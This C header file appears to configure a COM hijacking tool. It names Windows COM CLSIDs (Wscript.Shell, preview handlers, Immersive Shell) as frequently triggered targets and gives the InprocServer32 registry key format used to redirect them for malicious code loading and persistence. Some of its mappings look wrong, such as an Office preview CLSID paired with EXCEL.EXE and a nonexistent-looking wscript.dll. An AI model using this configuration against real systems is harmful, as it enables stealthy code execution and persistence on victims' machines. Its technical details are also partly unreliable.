#ifndef COM_HIJACK_CONFIG_H
#define COM_HIJACK_CONFIG_H

// High-traffic COM CLSID targets

// 1. Wscript.Shell (used by explorer.exe, Office, and many apps)
// CLSID: {72C24DD5-D70A-438B-8A42-98424B88AFB8}
// Triggers on script execution, file opening, and Office macros
#define WSCRIPT_SHELL_CLSID "{72C24DD5-D70A-438B-8A42-98424B88AFB8}"
#define WSCRIPT_SHELL_PATH "C:\\Windows\\System32\\wscript.dll"

// 2. Preview Handler for text files (triggers on every .txt file open in explorer)
// CLSID: {89BCB740-6119-101A-BCB7-00DD010655AF}
#define TEXT_PREVIEW_HANDLER_CLSID "{89BCB740-6119-101A-BCB7-00DD010655AF}"
#define TEXT_PREVIEW_HANDLER_PATH "C:\\Windows\\System32\\previewhandlers\\txtpreview.dll"

// 3. Office Document Preview Handler (triggers on Office file previews)
// CLSID: {00020906-0000-0000-C000-000000000046}
#define OFFICE_PREVIEW_HANDLER_CLSID "{00020906-0000-0000-C000-000000000046}"
#define OFFICE_PREVIEW_HANDLER_PATH "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"

// 4. Immersive Shell (Windows Shell Experience Host)
// CLSID: {C2F03A33-21F5-47FA-B4BB-156362A2F239}
// Used by explorer.exe and Windows 10/11 shell components
#define IMMERSIVE_SHELL_CLSID "{C2F03A33-21F5-47FA-B4BB-156362A2F239}"
#define IMMERSIVE_SHELL_PATH "C:\\Windows\\SystemApps\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe"

// Hijack method (Registry key to modify)
#define COM_HIJACK_KEY "SOFTWARE\\Classes\\CLSID\\%s\\InprocServer32"

#endif